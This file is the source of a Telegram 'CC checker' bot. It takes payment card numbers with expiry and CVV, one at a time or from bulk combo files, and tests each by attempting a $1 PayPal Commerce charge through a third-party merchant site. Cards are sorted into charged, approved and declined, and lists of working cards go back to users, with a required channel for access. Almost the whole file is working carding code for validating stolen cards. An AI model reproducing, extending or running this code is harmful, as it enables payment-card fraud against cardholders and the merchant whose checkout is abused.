#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PayPal Commerce CC Checker Bot
Free bot with interactive buttons like main bot
"""

import telebot
from telebot import types
import os
import time
import requests
import threading
import re
from pp_gate import drgam as pp_check

# Bot Configuration
BOT_TOKEN = "8524707699:AAFE"
OWNER_ID = 7567100614
REQUIRED_CHANNEL = "@TheEndForEveryone"
REQUIRED_CHANNEL_LINK = "https://t.me/TheEndForEveryone"

bot = telebot.TeleBot(BOT_TOKEN)

# Stop user dictionary for file checking
stopuser = {}

# Dictionary to track users currently checking files
users_checking_files = {}

# Anti-Spam: Track last check time for each user
user_last_check_time = {}
ANTI_SPAM_DELAY = 5  # seconds

# ============================================
# Subscription Check Function
# ============================================

def is_subscribed(user_id):
    """التحقق من اشتراك المستخدم في القروب"""
    if user_id == OWNER_ID:
        return True
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def send_subscribe_message(message):
    """إرسال رسالة طلب الاشتراك"""
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔗 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url=REQUIRED_CHANNEL_LINK)
    markup.add(btn)
    
    error_msg = f"""<b>
[ϟ] ❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 𝐣𝐨𝐢𝐧 𝐨𝐮𝐫 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐟𝐢𝐫𝐬𝐭!
[ϟ] 𝐉𝐨𝐢𝐧 𝐚𝐧𝐝 𝐩𝐫𝐞𝐬𝐬 /start 𝐚𝐠𝐚𝐢𝐧
- - - - - - - - - - - - - - - - - - - - - -
</b>"""
    bot.reply_to(message, error_msg, parse_mode="HTML", reply_markup=markup)

# ============================================
# BIN Info Function
# ============================================

def get_bin_info(cc):
    """الحصول على معلومات BIN"""
    try:
        data_bin = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5).json()
        bank = data_bin.get('bank', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
        country = data_bin.get('country_name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
        country_flag = data_bin.get('country_flag', '🌍')
        brand = data_bin.get('brand', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
        card_type = data_bin.get('type', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
        return bank, country, country_flag, brand, card_type
    except:
        try:
            data_bin = requests.get('https://data.handyapi.com/bin/'+cc[:6], timeout=10).json()
            if data_bin.get('Status') == 'SUCCESS':
                bank = data_bin.get('Issuer', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                country = data_bin.get('Country', {}).get('Name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                country_code = data_bin.get('Country', {}).get('A2', '')
                brand = data_bin.get('Scheme', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                card_type = data_bin.get('Type', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                if country_code:
                    country_flag = ''.join(chr(127397 + ord(c)) for c in country_code.upper())
                else:
                    country_flag = '🌍'
                return bank, country, country_flag, brand, card_type
        except:
            pass
    return '𝒖𝒏𝒌𝒏𝒐𝒘𝒏', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏', '🌍', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'

# ============================================
# Start Command
# ============================================

@bot.message_handler(commands=['start'])
def start_handler(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "User"
    
    if not is_subscribed(user_id):
        send_subscribe_message(message)
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬", callback_data="commands"),
        types.InlineKeyboardButton("ℹ️ 𝐈𝐧𝐟𝐨", callback_data="info")
    )
    
    text = f"""<b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 🔥
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐇𝐞𝐥𝐥𝐨, {first_name}!
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: PayPal Commerce ($1.00)
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐅𝐑𝐄𝐄 ✨
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐔𝐬𝐞 /pp 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐚 𝐜𝐚𝐫𝐝
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐔𝐩𝐥𝐨𝐚𝐝 .𝐭𝐱𝐭 𝐟𝐨𝐫 𝐜𝐨𝐦𝐛𝐨 𝐜𝐡𝐞𝐜𝐤
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: Eren - @ssv1s 🗣
</b>"""
    
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

# ============================================
# Callback Handler
# ============================================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    if call.data == "commands":
        text = """<b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] 📋 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐋𝐢𝐬𝐭
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] /start - 𝐒𝐭𝐚𝐫𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭
[<a href="https://t.me/erenchk2bot">ϟ</a>] /pp - 𝐂𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐔𝐩𝐥𝐨𝐚𝐝 .𝐭𝐱𝐭 - 𝐂𝐨𝐦𝐛𝐨 𝐜𝐡𝐞𝐜𝐤
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] 𝐅𝐨𝐫𝐦𝐚𝐭: cc|mm|yy|cvv
- - - - - - - - - - - - - - - - - - - - - -
</b>"""
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, text, parse_mode="HTML")
        
    elif call.data == "info":
        text = """<b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] ℹ️ 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] 🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: PayPal Commerce
[<a href="https://t.me/erenchk2bot">ϟ</a>] 💰 𝐀𝐦𝐨𝐮𝐧𝐭: $1.00
[<a href="https://t.me/erenchk2bot">ϟ</a>] 💎 𝐒𝐭𝐚𝐭𝐮𝐬: FREE
- - - - - - - - - - - - - - - - - - - - - -
</b>"""
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, text, parse_mode="HTML")
    
    elif call.data == "combo_start":
        if user_id not in users_checking_files:
            bot.answer_callback_query(call.id, "❌ No combo loaded")
            return
        
        session = users_checking_files[user_id]
        if session.get('running'):
            bot.answer_callback_query(call.id, "⚠️ Already running")
            return
        
        session['running'] = True
        stopuser[user_id] = False
        bot.answer_callback_query(call.id, "▶️ Starting...")
        
        # Start checking in thread
        threading.Thread(target=combo_check_thread, args=(user_id, chat_id, call.message.message_id, len(session['cards']), session['username'])).start()
        
    elif call.data == "combo_stop":
        if user_id in users_checking_files:
            stopuser[user_id] = True
            users_checking_files[user_id]['running'] = False
            bot.answer_callback_query(call.id, "⏹️ Stopping...")
        else:
            bot.answer_callback_query(call.id, "❌ No active session")
            
    elif call.data == "get_charged":
        if user_id not in users_checking_files:
            bot.answer_callback_query(call.id, "❌ No session")
            return
        
        hits = users_checking_files[user_id].get('charged', [])
        if not hits:
            bot.answer_callback_query(call.id, "No charged cards")
            return
        
        bot.answer_callback_query(call.id)
        hits_content = '\n'.join(hits)
        filename = f"charged_{len(hits)}.txt"
        
        with open(filename, 'w') as f:
            f.write(hits_content)
        
        with open(filename, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"<b>🔥 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {len(hits)}</b>", parse_mode="HTML")
        
        os.remove(filename)
        
    elif call.data == "get_approved":
        if user_id not in users_checking_files:
            bot.answer_callback_query(call.id, "❌ No session")
            return
        
        ccn = users_checking_files[user_id].get('approved', [])
        if not ccn:
            bot.answer_callback_query(call.id, "No approved cards")
            return
        
        bot.answer_callback_query(call.id)
        ccn_content = '\n'.join(ccn)
        filename = f"approved_{len(ccn)}.txt"
        
        with open(filename, 'w') as f:
            f.write(ccn_content)
        
        with open(filename, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"<b>✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {len(ccn)}</b>", parse_mode="HTML")
        
        os.remove(filename)
        
    elif call.data == "get_declined":
        if user_id not in users_checking_files:
            bot.answer_callback_query(call.id, "❌ No session")
            return
        
        dead = users_checking_files[user_id].get('declined', [])
        if not dead:
            bot.answer_callback_query(call.id, "No declined cards")
            return
        
        bot.answer_callback_query(call.id)
        dead_content = '\n'.join(dead)
        filename = f"declined_{len(dead)}.txt"
        
        with open(filename, 'w') as f:
            f.write(dead_content)
        
        with open(filename, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"<b>❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {len(dead)}</b>", parse_mode="HTML")
        
        os.remove(filename)
    
    elif call.data == "none":
        bot.answer_callback_query(call.id)

# ============================================
# PP Command - Manual Check
# ============================================

@bot.message_handler(commands=['pp'])
def pp_command(message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or "No Username"
        first_name = message.from_user.first_name or "User"
        
        # التحقق من الاشتراك
        if not is_subscribed(user_id):
            send_subscribe_message(message)
            return
        
        # Anti-Spam check
        if user_id != OWNER_ID:
            current_time = time.time()
            if user_id in user_last_check_time:
                time_diff = current_time - user_last_check_time[user_id]
                if time_diff < ANTI_SPAM_DELAY:
                    remaining = int(ANTI_SPAM_DELAY - time_diff)
                    spam_msg = f"""<b>
[<a href="https://t.me/l">ϟ</a>] ⏳ 𝐀𝐧𝐭𝐢-𝐒𝐩𝐚𝐦 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/l">ϟ</a>] 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 {remaining} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- - - - - - - - - - - - - - - - - - - - - -
</b>"""
                    bot.reply_to(message, spam_msg, parse_mode="HTML")
                    return
            user_last_check_time[user_id] = current_time
        
        # استخراج الكارت
        cc = None
        try:
            parts = message.text.split(None, 1)
            if len(parts) > 1:
                cc = parts[1].strip()
        except:
            pass
        
        # إذا لم يوجد كارت في الأمر، حاول استخراجه من الرد
        if not cc and message.reply_to_message:
            try:
                reply_text = message.reply_to_message.text or ""
                card_pattern = r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}'
                match = re.search(card_pattern, reply_text)
                if match:
                    cc = match.group(0)
            except:
                pass
        
        if not cc:
            bot.reply_to(message, "<b>❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 𝐟𝐨𝐫𝐦𝐚𝐭:\n/pp card|month|year|cvv</b>", parse_mode="HTML")
            return
        
        # التحقق من صيغة الكارت
        if '|' not in cc or len(cc.split('|')) != 4:
            bot.reply_to(message, "<b>❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐚𝐫𝐝 𝐟𝐨𝐫𝐦𝐚𝐭!\n𝐔𝐬𝐞: /pp card|month|year|cvv</b>", parse_mode="HTML")
            return
        
        wait_msg = bot.reply_to(message, "<b>⏳ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐜𝐚𝐫𝐝...</b>", parse_mode="HTML")
        
        # الحصول على معلومات البنك
        bank, country, country_flag, brand, card_type = get_bin_info(cc)
        
        start_time = time.time()
        
        # فحص الكارت
        try:
            result = pp_check(cc)
        except Exception as e:
            result = f"Error: {str(e)}"
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # تحديد حالة الكارت
        if 'Charge' in str(result):
            status_emoji = '🔥'
            status_text = 'Charged $1'
            response_text = '𝗖𝗵𝗮𝗿𝗴𝗲𝗱 🔥'
        elif 'CVV' in str(result) or 'Insufficient' in str(result):
            status_emoji = '✅'
            status_text = 'CVV Match' if 'CVV' in str(result) else 'Insufficient Funds'
            response_text = f'{result} ✅'
        else:
            status_emoji = '❌'
            status_text = 'Declined'
            response_text = f'{result} ❌'
        
        result_msg = f"""<b>#PayPal_Commerce ($1.00) [/pp] 🌟</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Card:</b> <code>{cc}</code>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Response: {response_text}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Status: {status_text}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Taken: {execution_time:.1f} S.</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Info: {brand} - {card_type}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Bank: {bank}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Country: {country} {country_flag}</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⎇</a>] <b>Req By: {first_name}</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⌤</a>] <b>Dev by: Eren - @ssv1s 🗣</b>"""
        
        bot.delete_message(message.chat.id, wait_msg.message_id)
        bot.send_message(message.chat.id, result_msg, parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f"<b>❌ 𝐄𝐫𝐫𝐨𝐫: {str(e)}</b>", parse_mode="HTML")

# ============================================
# File Handler - Combo Check
# ============================================

@bot.message_handler(content_types=['document'])
def document_handler(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "User"
    username = message.from_user.username or "NoUsername"
    
    if not is_subscribed(user_id):
        send_subscribe_message(message)
        return
    
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "<b>❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐩𝐥𝐨𝐚𝐝 𝐚 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞</b>", parse_mode="HTML")
        return
    
    # Check if user already has active session
    if user_id in users_checking_files and users_checking_files[user_id].get('running'):
        bot.reply_to(message, "<b>❌ 𝐘𝐨𝐮 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐡𝐚𝐯𝐞 𝐚𝐧 𝐚𝐜𝐭𝐢𝐯𝐞 𝐬𝐞𝐬𝐬𝐢𝐨𝐧!</b>", parse_mode="HTML")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        # Parse cards
        lines = [l.strip() for l in content.split('\n') if l.strip()]
        cards = []
        
        for line in lines:
            if '|' in line and len(line.split('|')) >= 4:
                cards.append(line)
        
        if not cards:
            bot.reply_to(message, "<b>❌ 𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐜𝐚𝐫𝐝𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐟𝐢𝐥𝐞!</b>", parse_mode="HTML")
            return
        
        # Store session (not running yet - waiting for Start button)
        users_checking_files[user_id] = {
            'cards': cards,
            'index': 0,
            'charged': [],
            'approved': [],
            'declined': [],
            'running': False,
            'username': username
        }
        stopuser[user_id] = False
        
        # Send initial message with only Start button
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("▶️ START", callback_data="combo_start"))
        
        text = f"""<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲: PayPal_Commerce ($1.00)
𝐁𝐲: @{username}
📁 Cards: {len(cards)}</b>"""
        
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=markup)
        
    except Exception as e:
        bot.reply_to(message, f"<b>❌ 𝐄𝐫𝐫𝐨𝐫: {str(e)}</b>", parse_mode="HTML")

def combo_check_thread(user_id, chat_id, msg_id, total, username):
    """Thread for combo checking"""
    session = users_checking_files.get(user_id)
    if not session:
        return
    
    cards = session['cards']
    current_card = ""
    current_status = ""
    
    for i, card in enumerate(cards):
        if stopuser.get(user_id, False) or not session.get('running', False):
            break
        
        session['index'] = i + 1
        current_card = card
        
        # Check card
        try:
            result = pp_check(card)
        except Exception as e:
            result = f"Error: {str(e)}"
        
        current_status = result
        
        # Update stats and send notifications
        if 'Charge' in str(result):
            session['charged'].append(card)
            # Send Charged notification with full details like manual check
            parts = card.split('|')
            cc = parts[0].strip()
            bank, country, country_flag, brand, card_type = get_bin_info(cc)
            hit_msg = f"""<b>#PayPal_Commerce ($1.00) 🔥 CHARGED</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Card:</b> <code>{card}</code>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Response: 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 🔥</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Status: Charged $1</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Info: {brand} - {card_type}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Bank: {bank}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Country: {country} {country_flag}</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⎇</a>] <b>Req By: @{username}</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⌤</a>] <b>Dev by: Eren - @ssv1s 🗣</b>"""
            bot.send_message(chat_id, hit_msg, parse_mode="HTML")
        elif 'Insufficient' in str(result):
            session['approved'].append(card)
            # Send Insufficient Funds notification with full details
            parts = card.split('|')
            cc = parts[0].strip()
            bank, country, country_flag, brand, card_type = get_bin_info(cc)
            ccn_msg = f"""<b>#PayPal_Commerce ($1.00) ✅ APPROVED</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Card:</b> <code>{card}</code>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Response: {result} ✅</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Status: Insufficient Funds</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Info: {brand} - {card_type}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Bank: {bank}</b>
[<a href="https://t.me/erenchk2bot">ϟ</a>] <b>Country: {country} {country_flag}</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⎇</a>] <b>Req By: @{username}</b>
- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⌤</a>] <b>Dev by: Eren - @ssv1s 🗣</b>"""
            bot.send_message(chat_id, ccn_msg, parse_mode="HTML")
        elif 'CVV' in str(result) or 'Do not honor' in str(result):
            session['approved'].append(card)
        else:
            session['declined'].append(card)
        
        # Update progress message with buttons showing card and status
        try:
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton(f"💳 {current_card}", callback_data="none"))
            markup.add(types.InlineKeyboardButton(f"📊 Status: {current_status}", callback_data="none"))
            markup.row(
                types.InlineKeyboardButton(f"🔥 Charged ➜ [ {len(session['charged'])} ]", callback_data="get_charged"),
                types.InlineKeyboardButton(f"✅ Approved ➜ [ {len(session['approved'])} ]", callback_data="get_approved")
            )
            markup.row(
                types.InlineKeyboardButton(f"❌ Declined ➜ [ {len(session['declined'])} ]", callback_data="get_declined"),
                types.InlineKeyboardButton(f"📁 Cards ➜ [ {i+1}/{total} ]", callback_data="none")
            )
            markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data="combo_stop"))
            
            text = f"""<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲: PayPal_Commerce ($1.00)
𝐁𝐲: @{username}</b>"""
            
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        except:
            pass
        
        time.sleep(2)  # Delay between checks
    
    # Finished
    session['running'] = False
    
    # Send final results
    try:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"🔥 Charged ➜ [ {len(session['charged'])} ]", callback_data="get_charged"),
            types.InlineKeyboardButton(f"✅ Approved ➜ [ {len(session['approved'])} ]", callback_data="get_approved")
        )
        markup.add(
            types.InlineKeyboardButton(f"❌ Declined ➜ [ {len(session['declined'])} ]", callback_data="get_declined"),
            types.InlineKeyboardButton(f"📁 Cards ➜ [ {session['index']}/{total} ]", callback_data="none")
        )
        
        text = f"""<b>✅ 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝!
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: PayPal_Commerce ($1.00)
𝐁𝐲: @{username}</b>

- - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/erenchk2bot">⌤</a>] <b>Dev by: Eren - @ssv1s 🗣</b>"""
        
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
    except:
        pass

# ============================================
# Main
# ============================================

if __name__ == "__main__":
    print("🤖 PayPal Commerce Bot Starting...")
    print("Gateway: firstparishbeverly.org")
    print("Amount: $1.00")
    print("Status: FREE")
    
    # Remove webhook and start polling
    bot.remove_webhook()
    time.sleep(1)
    
    print("✅ Bot is running!")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
